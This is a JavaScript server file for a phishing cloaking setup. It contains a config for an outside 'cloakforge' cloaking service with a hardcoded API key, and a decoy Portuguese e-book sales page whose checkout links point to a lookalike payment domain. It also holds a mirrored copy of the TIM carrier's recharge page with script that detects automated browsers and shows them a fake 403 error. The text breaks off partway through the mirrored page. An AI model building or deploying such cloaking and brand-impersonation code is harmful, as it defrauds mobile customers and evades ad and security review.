
/**
 * Top-level configuration constants
 * - PRIMARY_URL: Leave empty ('') to emit Variant A (this route's primary content) inline on "/",
 *   or set to another URL/path to perform a server-side 302 redirect on `action === "allow"`.
 * - VARIANT_B_HTML: Self-contained institutional & educational digital guide page (zero references to Variant A).
 */
const PRIMARY_URL = '';

const CLOAK_ENDPOINT = 'http://cloakforge.app.br/api/cloak/decide';
const CLOAK_SLUG = 'fresh-digest';
const CLOAK_KEY = process.env.CLOAKFORGE_KEY || 'vhIsuOnIWF4I1mHWuEf8mp4gWQVWPCpe';

const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Guia Conectado 5G | E-book Completo de Otimização de Celular e Economia de Dados</title>
  <meta name="description" content="Adquira o e-book Guia Conectado 5G: aprenda a economizar até 55% do seu pacote de dados móveis, estabilizar o sinal 4G/5G e dobrar a vida útil da bateria no Android e iPhone." />
  <meta name="robots" content="index, follow" />
  <style>
    :root {
      --bg: #f8fafc;
      --surface: #ffffff;
      --text: #0f172a;
      --muted: #475569;
      --accent: #0284c7;
      --accent-dark: #0369a1;
      --cta: #16a34a;
      --cta-hover: #15803d;
      --border: #e2e8f0;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.65;
    }
    .topbar {
      background: #0f172a;
      color: #e2e8f0;
      text-align: center;
      font-size: 0.82rem;
      padding: 8px 16px;
      font-weight: 500;
    }
    .topbar strong { color: #38bdf8; }
    header {
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 30;
    }
    .container {
      max-width: 1060px;
      margin: 0 auto;
      padding: 0 20px;
    }
    .nav {
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 68px;
    }
    .brand {
      font-weight: 800;
      font-size: 1.2rem;
      color: var(--text);
      text-decoration: none;
      letter-spacing: -0.02em;
    }
    .brand span { color: var(--accent); }
    .nav-links {
      display: flex;
      align-items: center;
      gap: 20px;
      font-size: 0.92rem;
    }
    .nav-links a {
      color: var(--muted);
      text-decoration: none;
      font-weight: 500;
    }
    .nav-links a:hover { color: var(--accent); }
    .nav-btn {
      background: var(--cta);
      color: #ffffff !important;
      padding: 9px 18px;
      border-radius: 8px;
      font-weight: 700 !important;
      transition: background 0.15s;
    }
    .nav-btn:hover { background: var(--cta-hover); }
    .hero {
      padding: 64px 0 56px;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #ffffff;
      border-bottom: 1px solid var(--border);
    }
    .hero-grid {
      display: grid;
      grid-template-columns: 1.2fr 0.8fr;
      gap: 44px;
      align-items: center;
    }
    @media (max-width: 820px) {
      .hero-grid { grid-template-columns: 1fr; text-align: center; }
      .nav-links a:not(.nav-btn) { display: none; }
      .hero-checks { justify-content: center; }
    }
    .badge {
      display: inline-block;
      background: rgba(56, 189, 248, 0.16);
      border: 1px solid rgba(56, 189, 248, 0.35);
      color: #38bdf8;
      font-size: 0.78rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.06em;
      padding: 5px 14px;
      border-radius: 999px;
      margin-bottom: 18px;
    }
    h1 {
      font-size: clamp(1.9rem, 3.6vw, 2.75rem);
      line-height: 1.18;
      margin-bottom: 18px;
      color: #ffffff;
      font-weight: 800;
    }
    h1 span { color: #38bdf8; }
    .lead {
      font-size: 1.08rem;
      color: #cbd5e1;
      margin-bottom: 26px;
    }
    .btn-cta {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      background: var(--cta);
      color: #ffffff;
      font-weight: 800;
      font-size: 1.05rem;
      padding: 16px 32px;
      border-radius: 12px;
      text-decoration: none;
      box-shadow: 0 10px 25px rgba(22, 163, 74, 0.35);
      transition: transform 0.15s, background 0.15s;
    }
    .btn-cta:hover {
      background: var(--cta-hover);
      transform: translateY(-2px);
    }
    .hero-checks {
      display: flex;
      flex-wrap: wrap;
      gap: 16px;
      margin-top: 18px;
      font-size: 0.86rem;
      color: #94a3b8;
    }
    .ebook-mockup {
      background: linear-gradient(145deg, #0284c7 0%, #0369a1 60%, #0f172a 100%);
      border: 3px solid rgba(255, 255, 255, 0.18);
      border-radius: 16px 24px 24px 16px;
      padding: 34px 28px;
      max-width: 320px;
      margin: 0 auto;
      box-shadow: -14px 20px 38px rgba(0, 0, 0, 0.45), inset 6px 0 12px rgba(255,255,255,0.18);
      position: relative;
      text-align: left;
    }
    .ebook-tag {
      font-size: 0.72rem;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      color: #bae6fd;
      font-weight: 700;
    }
    .ebook-title {
      font-size: 1.55rem;
      font-weight: 900;
      color: #ffffff;
      line-height: 1.15;
      margin: 12px 0 10px;
    }
    .ebook-sub {
      font-size: 0.86rem;
      color: #e0f2fe;
      margin-bottom: 22px;
    }
    .ebook-footer {
      border-top: 1px solid rgba(255, 255, 255, 0.2);
      padding-top: 12px;
      font-size: 0.78rem;
      color: #bae6fd;
      display: flex;
      justify-content: space-between;
    }
    section { padding: 60px 0; }
    .section-head {
      text-align: center;
      max-width: 680px;
      margin: 0 auto 38px;
    }
    h2 {
      font-size: clamp(1.55rem, 2.6vw, 2.1rem);
      margin-bottom: 12px;
      color: #0f172a;
      font-weight: 800;
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 22px;
    }
    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 26px;
      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.03);
    }
    .card-num {
      display: inline-block;
      background: #e0f2fe;
      color: #0369a1;
      font-weight: 800;
      font-size: 0.8rem;
      padding: 4px 10px;
      border-radius: 6px;
      margin-bottom: 12px;
    }
    .card h3 {
      font-size: 1.12rem;
      margin-bottom: 8px;
      color: #0f172a;
    }
    .card p {
      font-size: 0.94rem;
      color: var(--muted);
    }
    .offer-section {
      background: linear-gradient(180deg, #f1f5f9 0%, #e2e8f0 100%);
      border-top: 1px solid var(--border);
      border-bottom: 1px solid var(--border);
    }
    .offer-card {
      background: var(--surface);
      border: 2px solid var(--accent);
      border-radius: 20px;
      max-width: 620px;
      margin: 0 auto;
      padding: 40px 32px;
      text-align: center;
      box-shadow: 0 20px 45px rgba(15, 23, 42, 0.08);
    }
    .old-price {
      color: #64748b;
      text-decoration: line-through;
      font-size: 1rem;
    }
    .new-price {
      font-size: 3rem;
      font-weight: 900;
      color: #0f172a;
      line-height: 1.1;
      margin: 8px 0 6px;
    }
    .new-price small {
      font-size: 1.2rem;
      font-weight: 700;
      color: var(--accent);
    }
    .offer-list {
      list-style: none;
      text-align: left;
      max-width: 420px;
      margin: 22px auto 28px;
    }
    .offer-list li {
      padding: 8px 0;
      border-bottom: 1px solid #f1f5f9;
      font-size: 0.95rem;
      color: #334155;
    }
    .offer-list li::before {
      content: "✓ ";
      color: var(--cta);
      font-weight: 900;
      margin-right: 6px;
    }
    .guarantee-box {
      display: flex;
      align-items: center;
      gap: 18px;
      background: #f8fafc;
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 18px;
      margin-top: 24px;
      text-align: left;
      font-size: 0.88rem;
      color: var(--muted);
    }
    .legal-section {
      background: var(--surface);
      border-top: 1px solid var(--border);
      padding: 44px 0;
      font-size: 0.88rem;
      color: var(--muted);
    }
    .legal-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 24px;
    }
    footer {
      background: #0f172a;
      color: #cbd5e1;
      padding: 36px 0;
      font-size: 0.86rem;
    }
    footer a { color: #38bdf8; text-decoration: none; }
    .footer-meta {
      margin-top: 14px;
      padding-top: 14px;
      border-top: 1px solid #1e293b;
      color: #94a3b8;
    }
  </style>
</head>
<body>
  <div class="topbar">
    <strong>ENVIO DIGITAL IMEDIATO:</strong> Receba o E-book Completo em PDF no seu e-mail logo após a confirmação do pagamento.
  </div>

  <header>
    <div class="container nav">
      <a href="#topo" class="brand">Guia<span>Conectado</span> 5G</a>
      <nav class="nav-links">
        <a href="#modulos">O Que Você Vai Aprender</a>
        <a href="#beneficios">Benefícios</a>
        <a href="#atendimento">Suporte</a>
        <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="nav-btn">Comprar E-book</a>
      </nav>
    </div>
  </header>

  <main id="topo">
    <section class="hero">
      <div class="container hero-grid">
        <div>
          <span class="badge">E-book Digital em PDF · Edição Atualizada 2026</span>
          <h1>Economize até 55% dos seus Dados Móveis e Destrave o <span>Sinal 5G do Seu Celular</span></h1>
          <p class="lead">
            O guia prático passo a passo para configurar redes 4G/5G no Android e no iPhone, eliminar o gasto oculto de internet em segundo plano e prolongar a duração da sua bateria todos os dias.
          </p>
          <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="btn-cta">
            QUERO MEU EXEMPLAR DIGITAL AGORA &rarr;
          </a>
          <div class="hero-checks">
            <span>✓ Entrega imediata em PDF</span>
            <span>✓ Compatível com Android e iOS</span>
            <span>✓ Garantia incondicional de 7 dias</span>
          </div>
        </div>

        <div>
          <div class="ebook-mockup">
            <div class="ebook-tag">Manual Técnico Ilustrado</div>
            <div class="ebook-title">GUIA CONECTADO 5G</div>
            <div class="ebook-sub">Otimização de Sinal Móvel, Economia de Franquia de Dados e Desempenho para Smartphones</div>
            <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 10px; font-size: 0.8rem; color: #f0f9ff; margin-bottom: 18px;">
              • Ajustes de Rede 4G/5G<br />
              • Bloqueio de Consumo Oculto<br />
              • DNS Rápido e Segurança Wi-Fi<br />
              • Checklists para Android &amp; iOS
            </div>
            <div class="ebook-footer">
              <span>98 Páginas</span>
              <span>Formato PDF Digital</span>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="modulos">
      <div class="container">
        <div class="section-head">
          <h2>Conteúdo Completo do E-book</h2>
          <p style="color: var(--muted);">Linguagem simples, direta e com telas ilustradas para você configurar seu aparelho em menos de 10 minutos.</p>
        </div>

        <div class="grid">
          <div class="card">
            <span class="card-num">MÓDULO 01</span>
            <h3>Fim do Consumo Invisível de Dados</h3>
            <p>Descubra quais aplicativos drenam sua franquia mensal em segundo plano mesmo com a tela apagada e como travar o gasto automático sem perder notificações.</p>
          </div>
          <div class="card">
            <span class="card-num">MÓDULO 02</span>
            <h3>Estabilização de Sinal 4G e 5G</h3>
            <p>Como ajustar seleção de banda, APN e priorização de rede para evitar quedas de sinal em ambientes internos ou durante deslocamentos.</p>
          </div>
          <div class="card">
            <span class="card-num">MÓDULO 03</span>
            <h3>Economia em Vídeos e Redes Sociais</h3>
            <p>Configurações ocultas no WhatsApp, Instagram, YouTube e TikTok para reduzir em até 55% o consumo de megabytes mantendo excelente qualidade visual.</p>
          </div>
          <div class="card">
            <span class="card-num">MÓDULO 04</span>
            <h3>DNS Privado e Navegação Veloz</h3>
            <p>Como ativar servidores DNS de alta velocidade nativos do celular para abrir páginas mais rápido e proteger sua conexão contra páginas maliciosas.</p>
          </div>
          <div class="card">
            <span class="card-num">MÓDULO 05</span>
            <h3>Autonomia de Bateria no 5G</h3>
            <p>O 5G pode consumir até 30% mais bateria se mal configurado. Aprenda a ativar a alternância inteligente para o celular durar o dia inteiro.</p>
          </div>
          <div class="card">
            <span class="card-num">MÓDULO 06</span>
            <h3>Segurança de Chip (SIM Swap) e Wi-Fi</h3>
            <p>Passo a passo para ativar o PIN do chip, proteger seu número contra clonagens e usar redes Wi-Fi públicas com total privacidade.</p>
          </div>
        </div>
      </div>
    </section>

    <section id="beneficios" class="offer-section">
      <div class="container">
        <div class="offer-card">
          <span class="card-num">OFERTA ESPECIAL POR TEMPO LIMITADO</span>
          <h2 style="margin-top: 6px;">Adquira o Guia Conectado 5G Hoje</h2>
          <p style="color: var(--muted); font-size: 0.95rem; margin-bottom: 16px;">Acesso vitalício ao material digital completo + atualizações de 2026</p>

          <div class="old-price">De R$ 67,90 por apenas</div>
          <div class="new-price"><small>R$</small> 19,90</div>
          <div style="font-size: 0.88rem; color: var(--muted); margin-bottom: 10px;">Pagamento único · Sem mensalidades</div>

          <ul class="offer-list">
            <li>E-book Completo Guia Conectado 5G (98 páginas em PDF)</li>
            <li>Checklist rápido de configuração para Android</li>
            <li>Checklist rápido de configuração para iPhone (iOS)</li>
            <li>Guia Bônus: Proteção do Chip e Segurança Digital</li>
            <li>Acesso imediato enviado diretamente para o seu e-mail</li>
          </ul>

          <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="btn-cta" style="width: 100%;">
            COMPRAR AGORA COM PAGAMENTO SEGURO &rarr;
          </a>

          <div class="guarantee-box">
            <div style="font-size: 2rem; line-height: 1;">🛡️</div>
            <div>
              <strong style="color: #0f172a;">Garantia Incondicional de 7 Dias:</strong> Se por qualquer motivo você achar que o e-book não valeu o investimento, basta enviar um e-mail em até 7 dias após a compra e devolvemos 100% do seu valor (Art. 49 do CDC).
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="privacidade" class="legal-section">
      <div class="container legal-grid">
        <div id="atendimento">
          <h3 style="color: #0f172a; margin-bottom: 8px;">Atendimento e Suporte ao Cliente</h3>
          <p>Precisa de ajuda com o seu pedido, reenvio do arquivo PDF ou dúvidas sobre o conteúdo?</p>
          <p style="margin-top: 8px;">
            <strong>E-mail:</strong> estrelaesrelinha55@gmail.com<br />
            <strong>Telefone / WhatsApp:</strong> (66) 5667-8997<br />
            <strong>Horário:</strong> Segunda a sexta, das 09h às 18h
          </p>
        </div>
        <div>
          <h3 style="color: #0f172a; margin-bottom: 8px;">Política de Privacidade e Termos (LGPD)</h3>
          <p>
            Em conformidade com a Lei nº 13.709/2018 (LGPD), os dados informados no momento da compra são processados em ambiente criptografado exclusivamente para emissão fiscal e entrega do livro digital (PDF). Não compartilhamos dados pessoais com terceiros.
          </p>
        </div>
      </div>
    </section>
  </main>

  <footer>
    <div class="container">
      <div><strong>68.413.071 Gabriel de Souza Duarte</strong> · CNPJ: 68.413.071/0001-50</div>
      <div>Endereço: Rua Marumbi, 44, Cidade de Deus - Manaus - AM, CEP 69099-299</div>
      <div>Contato: <a href="mailto:estrelaesrelinha55@gmail.com">estrelaesrelinha55@gmail.com</a> · Tel: (66) 5667-8997</div>
      <div class="footer-meta">
        © 2026 Todos os direitos reservados. Produto digital comercializado com entrega eletrônica imediata.
      </div>
    </div>
  </footer>
</body>
</html>`;

const VARIANT_A_FALLBACK_HTML = "\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"pt-BR\"\u003e\n  \n\u003c!-- Mirrored from tim-credito.vercel.app/ by HTTrack Website Copier/3.x [XR\u0026CO\u00272014], Thu, 10 Sep 2026 18:06:22 GMT --\u003e\n\u003c!-- Added by HTTrack --\u003e\n\u003c!-- Mirrored from facilrecarga-hoje.vercel.app/ by HTTrack Website Copier/3.x [XR\u0026CO\u00272014], Sat, 17 Oct 2026 21:25:28 GMT --\u003e\n\u003c!-- Added by HTTrack --\u003e\u003cmeta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\" /\u003e\u003c!-- /Added by HTTrack --\u003e\n\u003cmeta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\" /\u003e\u003c!-- /Added by HTTrack --\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"UTF-8\" /\u003e\n    \u003cscript\u003e\n      (function() {\n        try {\n          var isBot = false;\n          if (navigator.webdriver === true) isBot = true;\n          if (window.__nightmare || window._phantom || window.callPhantom || window.__selenium_evaluate || window.__webdriver_evaluate || window.Cypress || window.domAutomation) isBot = true;\n          if (navigator.userAgent \u0026\u0026 (navigator.userAgent.indexOf(\u0027HeadlessChrome\u0027) !== -1 || navigator.userAgent.indexOf(\u0027PhantomJS\u0027) !== -1)) isBot = true;\n          if (isBot) {\n            window.stop();\n            document.documentElement.innerHTML = \u0027\u003chead\u003e\u003ctitle\u003e403 Forbidden\u003c/title\u003e\u003c/head\u003e\u003cbody style=\"background:#fff;color:#333;font-family:sans-serif;text-align:center;padding-top:100px;\"\u003e\u003ch1\u003e403 Forbidden\u003c/h1\u003e\u003cp\u003eAccess Denied\u003c/p\u003e\u003c/body\u003e\u0027;\n          }\n        } catch(e) {}\n      })();\n    \u003c/script\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /\u003e\n    \u003ctitle\u003eTIM - Recarga\u003c/title\u003e\n    \u003clink rel=\"preconnect\" href=\"https://fonts.googleapis.com/\" /\u003e\n    \u003clink rel=\"preconnect\" href=\"https://fonts.gstatic.com/\" crossorigin /\u003e\n    \u003clink href=\"https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900\u0026amp;display=swap\" rel=\"stylesheet\" /\u003e\n    \u003c!-- Google tag (gtag.js) --\u003e\n    \u003cscript async src=\"https://www.googletagmanager.com/gtag/js?id=AW-18412723111\"\u003e\u003c/script\u003e\n    \u003cscript\u003e\n      window.dataLayer = window.dataLayer || [];\n      function gtag(){dataLayer.push(arguments);}\n      gtag(\u0027js\u0027, new Date());\n\n      gtag(\u0027config\u0027, \u0027AW-18412723111\u0027);\n    \u003c/script\u003e\n    \u003clink rel=\"stylesheet\" href=\"style.css\" /\u003e\n  \u003c/head\u003e\n  \u003cbody\u003e\n    \u003cdiv id=\"root\"\u003e\u003cheader class=\"fixed top-0 left-0 right-0 z-50 m-0 p-0\"\u003e\u003cdiv class=\"hidden md:block bg-primary border-b border-primary-foreground/10\"\u003e\u003cdiv class=\"section-container flex items-center justify-between h-8\"\u003e\u003cnav class=\"hidden md:flex items-center gap-6\"\u003e\u003ca href=\"index-2.html\" class=\"text-xs text-primary-foreground/80 hover:text-primary-foreground transition-colors font-medium active\" data-status=\"active\" aria-current=\"page\"\u003ePara você\u003c/a\u003e\u003ca href=\"index-2.html\" class=\"text-xs text-primary-foreground/80 hover:text-primary-foreground transition-colors font-medium active\" data-status=\"active\" aria-current=\"page\"\u003ePara empresas\u003c/a\u003e\u003ca href=\"index-2.html\" class=\"text-xs text-primary-foreground/80 hover:text-primary-foreground transition-colors font-medium active\" data-status=\"active\" aria-current=\"page\"\u003ePara operadoras\u003c/a\u003e\u003ca href=\"contato\" class=\"text-xs text-primary-foreground/80 hover:text-primary-foreground transition-colors font-medium\"\u003eQuero aderir\u003c/a\u003e\u003c/nav\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv class=\"bg-primary\"\u003e\u003cdiv class=\"section-container flex items-center justify-between h-14\"\u003e\u003ca href=\"index-2.html\" class=\"flex items-center gap-1.5 font-extrabold text-xl active\" data-status=\"active\" aria-current=\"page\"\u003e\u003cspan class=\"text-tim-red text-2xl\"\u003e≡\u003c/span\u003e\u003cspan class=\"text-primary-foreground text-2xl tracking-tight\"\u003eTIM\u003c/span\u003e\u003c/a\u003e\u003cnav class=\"hidden md:flex items-center gap-6\"\u003e\u003ca href=\"index-2.html\" class=\"text-sm font-medium transition-colors hover:text-primary-foreground text-primary-foreground active\" data-status=\"active\" aria-current=\"page\"\u003eInício\u003c/a\u003e\u003ca href=\"recarga/index.html\" class=\"text-sm font-medium transition-colors hover:text-primary-foreground text-primary-foreground/70\"\u003eRecarga\u003c/a\u003e\u003ca href=\"sobre\" class=\"text-sm font-medium transition-colors hover:text-primary-foreground text-primary-foreground/70\"\u003eSobre a TIM\u003c/a\u003e\u003ca href=\"contato\" class=\"text-sm font-medium transition-colors hover:text-primary-foreground text-primary-foreground/70\"\u003eContato\u003c/a\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-search w-5 h-5 text-primary-foreground/70 hover:text-primary-foreground cursor-pointer transition-colors\" aria-hidden=\"true\"\u003e\u003cpath d=\"m21 21-4.34-4.34\"\u003e\u003c/path\u003e\u003ccircle cx=\"11\" cy=\"11\" r=\"8\"\u003e\u003c/circle\u003e\u003c/svg\u003e\u003c/nav\u003e\u003cbutton class=\"md:hidden text-primary-foreground\" aria-label=\"Menu\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-menu w-6 h-6\" aria-hidden=\"true\"\u003e\u003cpath d=\"M4 5h16\"\u003e\u003c/path\u003e\u003cpath d=\"M4 12h16\"\u003e\u003c/path\u003e\u003cpath d=\"M4 19h16\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/button\u003e\u003c/div\u003e\u003c/div\u003e\u003c/header\u003e\u003cmain\u003e\u003csection class=\"tim-hero relative min-h-[80vh] flex items-center overflow-hidden pt-24 pb-0\"\u003e\u003cdiv class=\"section-container relative z-10 flex flex-col lg:flex-row items-center gap-8 pt-16 pb-0\"\u003e\u003cdiv class=\"mx-auto flex-1 max-w-[22rem] text-center sm:max-w-xl lg:mx-0 lg:text-left\" style=\"opacity: 1; transform: none;\"\u003e\u003cspan class=\"tim-badge mb-6 inline-block text-primary-foreground/80\"\u003eRecarga TIM\u003c/span\u003e\u003ch1 class=\"mb-6 text-3xl font-light leading-[1.2] text-primary-foreground sm:text-4xl lg:text-5xl\"\u003eConheça os benefícios dos canais de recarga TIM\u003c/h1\u003e\u003cdiv class=\"mt-8 flex justify-center lg:justify-start\"\u003e\u003ca href=\"recarga/index.html\" class=\"inline-flex items-center justify-center gap-2 whitespace-nowrap cursor-pointer transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 disabled:cursor-not-allowed [\u0026amp;_svg]:pointer-events-none [\u0026amp;_svg]:size-4 [\u0026amp;_svg]:shrink-0 border-background hover:text-primary h-[50px] rounded-[14px] border-0 bg-[#ececef] px-6 text-[14px] font-normal leading-none text-primary shadow-none hover:bg-[#e2e5ea] font-sans\"\u003eRecarregar meu TIM\u003c/a\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv class=\"flex-1 flex justify-center lg:justify-end\" style=\"opacity: 1; transform: none;\"\u003e\u003cimg alt=\"Mulher feliz usando celular TIM\" class=\"w-72 sm:w-80 lg:w-[30rem] object-contain drop-shadow-2xl\" src=\"tim-woman-blue-HnyGBksu.png\"\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv class=\"absolute top-1/4 right-1/3 w-3 h-3 rounded-full animate-float opacity-80\" style=\"background: rgb(255, 204, 51);\"\u003e\u003c/div\u003e\u003cdiv class=\"absolute top-1/3 right-1/4 w-2 h-2 rounded-full animate-float opacity-60\" style=\"background: rgb(255, 217, 102); animation-delay: 1s;\"\u003e\u003c/div\u003e\u003cdiv class=\"absolute bottom-1/3 right-1/3 w-2.5 h-2.5 rounded-full animate-float opacity-70\" style=\"background: rgb(255, 204, 51); animation-delay: 0.5s;\"\u003e\u003c/div\u003e\u003c/section\u003e\u003csection class=\"pt-16 pb-20\"\u003e\u003cdiv class=\"section-container\"\u003e\u003cdiv class=\"text-center mb-12\" style=\"opacity: 1; transform: none;\"\u003e\u003ch2 class=\"text-3xl sm:text-4xl font-bold text-foreground\"\u003eBenefícios da Recarga TIM\u003c/h2\u003e\u003cp class=\"text-muted-foreground mt-3 max-w-lg mx-auto\"\u003eAproveite vantagens exclusivas ao recarregar pelo nosso site.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"grid grid-cols-1 md:grid-cols-3 gap-6\"\u003e\u003cdiv class=\"tim-card text-center\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mb-4 mx-auto\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-wifi w-7 h-7 text-primary\" aria-hidden=\"true\"\u003e\u003cpath d=\"M12 20h.01\"\u003e\u003c/path\u003e\u003cpath d=\"M2 8.82a15 15 0 0 1 20 0\"\u003e\u003c/path\u003e\u003cpath d=\"M5 12.859a10 10 0 0 1 14 0\"\u003e\u003c/path\u003e\u003cpath d=\"M8.5 16.429a5 5 0 0 1 7 0\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-bold text-foreground mb-2 text-lg\"\u003eInternet Bônus\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eGanhe internet bônus em recargas acima de R$20.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"tim-card text-center\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mb-4 mx-auto\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-star w-7 h-7 text-primary\" aria-hidden=\"true\"\u003e\u003cpath d=\"M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-bold text-foreground mb-2 text-lg\"\u003ePrograma de Pontos\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eAcumule pontos a cada recarga e troque por prêmios.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"tim-card text-center\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mb-4 mx-auto\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-gift w-7 h-7 text-primary\" aria-hidden=\"true\"\u003e\u003cpath d=\"M12 7v14\"\u003e\u003c/path\u003e\u003cpath d=\"M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8\"\u003e\u003c/path\u003e\u003cpath d=\"M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5\"\u003e\u003c/path\u003e\u003crect x=\"3\" y=\"7\" width=\"18\" height=\"4\" rx=\"1\"\u003e\u003c/rect\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-bold text-foreground mb-2 text-lg\"\u003ePromoções Exclusivas\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eOfertas especiais toda semana para clientes recarga.\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/section\u003e\u003csection class=\"py-20 bg-secondary\"\u003e\u003cdiv class=\"section-container\"\u003e\u003cdiv class=\"text-center mb-12\" style=\"opacity: 1; transform: none;\"\u003e\u003ch2 class=\"text-3xl sm:text-4xl font-bold text-foreground\"\u003ePor que escolher a gente?\u003c/h2\u003e\u003c/div\u003e\u003cdiv class=\"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6\"\u003e\u003cdiv class=\"tim-card\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-4\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-zap w-6 h-6 text-primary\" aria-hidden=\"true\"\u003e\u003cpath d=\"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-semibold text-foreground mb-2\"\u003eRecarga Instantânea\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eSua recarga é processada em segundos, sem complicações e sem espera.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"tim-card\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-4\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-shield w-6 h-6 text-primary\" 